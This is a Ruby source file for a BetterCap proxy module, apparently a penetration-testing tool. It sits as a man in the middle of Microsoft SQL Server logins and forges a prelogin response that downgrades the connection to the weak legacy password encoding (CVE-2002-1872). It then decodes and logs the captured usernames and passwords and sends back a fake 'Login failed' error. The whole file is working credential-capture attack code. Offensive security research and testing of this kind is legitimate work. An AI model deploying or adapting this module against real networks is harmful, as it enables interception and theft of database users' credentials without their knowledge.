=begin
Author : @_xpn_
Email  : xpnsec@protonmail.com
Web    : https://xpn.github.io
This project is released under the GPL 3 license.
=end

class MSSQLAuth < BetterCap::Proxy::TCP::Module
  meta(
    'Name'        => 'MSSQLAuth',
    'Description' => 'Downgrades MSSQL encryption and capture login credentials.',
    'Version'     => '1.0.0',
    'Author'      => "XPN - xpnsec@protonmail.com - https://xpn.github.io",
    'License'     => 'GPL3'
  )

  def on_response( event )
    if @respondwith != nil
      event.data = @respondwith
    end
  end

  def on_data( event )
    @respondwith = mssql_parse_reply(event)
  end

  #########################################################################################################
  # The below has been ported from metasploit auxiliary/server/capture/mssql
  # (https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/server/capture/mssql.rb)
  #
  # Full credit to the author Patrik Karlsson <patrik[at]cqure.net>
  #########################################################################################################

  class Constants
    TDS_MSG_RESPONSE  = 0x04
    TDS_MSG_LOGIN     = 0x10
    TDS_MSG_PRELOGIN  = 0x12
    TDS_TOKEN_ERROR   = 0xAA
  end

  # Decodes the MSSQL client password (CVE-2002-1872 found by David Litchfield)
  def mssql_tds_decrypt( pass )
    return (pass.unpack("C*").map {|c| ((( c ^ 0xa5 ) & 0x0F) << 4) | ((( c ^ 0xa5 ) & 0xF0 ) >> 4) }.pack("C*")).unpack('v*').pack('C*')
  end

  # Processes our incoming TCP data event, and returns a packet ready to hijack the response
  # If the token is not recognised, we pass the packet to the client unmodified
  def mssql_parse_reply( event )
    return if not event.data

    data = event.data.dup

    token = data.slice!(0,1).unpack('C')[0]

    case token
      when Constants::TDS_MSG_LOGIN
    	  BetterCap::Logger.info "[#{'MSSQL DOWNGRADE'.green}] TDS_MSG_LOGIN Received, parsing for credentials"
        mssql_parse_login(data)
        return mssql_send_error("Login failed for user")

      when Constants::TDS_MSG_PRELOGIN
    	  BetterCap::Logger.info "[#{'MSSQL DOWNGRADE'.green}] TDS_MSG_PRELOGIN Received, forcing downgrade"
        return mssql_send_prelogin_response

      else
        # We don't know this token, so we let the traffic through as usual
        return nil
    end
  end

  # Prelogin response to force the downgrade to the vulnerable password encoding method (CVE-2002-1872)
  def mssql_send_prelogin_response()
    return [
      Constants::TDS_MSG_RESPONSE,
      1, # status
      0x002b, # length
      "0000010000001a00060100200001020021000103002200000400220001ff0a3206510000020000"
    ].pack("CCnH*")
  end

  # Extracts login information from the authentication request
  def mssql_parse_login( data )
    status = data.slice!(0,1).unpack('C')[0]
    len = data.slice!(0,2).unpack('n')[0]

    if len > data.length + 4
      return
    end

    # slice of:
    #   * channel, packetno, window
    #   * login header
    #   * client name lengt & offset
    login_hdr = data.slice!(0,4 + 36 + 4)

    username_offset = data.slice!(0,2).unpack('v')[0]
    username_length = data.slice!(0,2).unpack('v')[0]

    pw_offset = data.slice!(0,2).unpack('v')[0]
    pw_length = data.slice!(0,2).unpack('v')[0]

    appname_offset = data.slice!(0,2).unpack('v')[0]
    appname_length = data.slice!(0,2).unpack('v')[0]

    srvname_offset = data.slice!(0,2).unpack('v')[0]
    srvname_length = data.slice!(0,2).unpack('v')[0]

    if username_offset > 0 and pw_offset > 0
      offset = username_offset - 56

      user = data[offset..(offset + username_length * 2)].unpack('v*').pack('C*')

      offset = pw_offset - 56
      if pw_length == 0
        pass = "<empty>"
      else
        pass = mssql_tds_decrypt(data[offset..(offset + pw_length * 2)].unpack("A*")[0])
      end

      offset = srvname_offset - 56
      srvname = data[offset..(offset + srvname_length * 2)].unpack('v*').pack('C*')
      BetterCap::Logger.info "[#{'MSSQL DOWNGRADE'.green}] [#{'Username'.yellow}] #{user.yellow} | [#{'Password'.yellow}] #{pass.yellow} | [#{'Server Name'.yellow}] #{srvname.yellow}"
    else
      BetterCap::Logger.info "[#{'MSSQL DOWNGRADE'.yellow}] Could not parse login request for authentication credentials"
    end
  end

  # Sends the provided error message back to the client
  def mssql_send_error( msg )
    return [
      Constants::TDS_MSG_RESPONSE,
      1, # status
      0x0020 + msg.length * 2,
      0x0037, # channel: 55
      0x01,   # packet no: 1
      0x00,   # window: 0
      Constants::TDS_TOKEN_ERROR,
      0x000C + msg.length * 2,
      18456,  # SQL Error number
      1,      # state: 1
      14,     # severity: 14
      msg.length,   # error msg length
      0,
      msg.unpack('C*').pack('v*'),
      0, # server name length
      0, # process name length
      0, # line number
      "fd0200000000000000"
      ].pack("CCnnCCCvVCCCCA*CCnH*")
  end
end
